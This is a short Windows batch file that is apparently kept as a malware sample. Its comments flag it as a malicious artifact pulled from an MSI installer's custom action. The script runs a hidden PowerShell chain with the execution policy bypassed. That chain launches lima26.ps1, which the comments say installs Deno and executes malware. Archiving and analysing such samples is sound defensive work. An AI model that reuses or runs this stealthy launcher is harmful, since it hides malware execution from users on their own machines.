@echo off
REM ===================================================================
REM ⚠️ MALICIOUS ARTIFACT — DO NOT EXECUTE
REM ===================================================================
REM This is the ORIGINAL batch file from the MSI installer's Custom Action.
REM It launches lima26.ps1 which installs Deno and executes malware.
REM
REM Source: MSI Custom Action "RunLauncher" (Sequence 6601)
REM File: kilo_piece66.cmd (268 bytes)
REM ===================================================================

@set "SCRIPTDIR=%~dp0"
@powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "Start-Process powershell -ArgumentList (^
     '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden ^
      -File ""' + $env:SCRIPTDIR + 'lima26.ps1""') -WindowStyle Hidden"
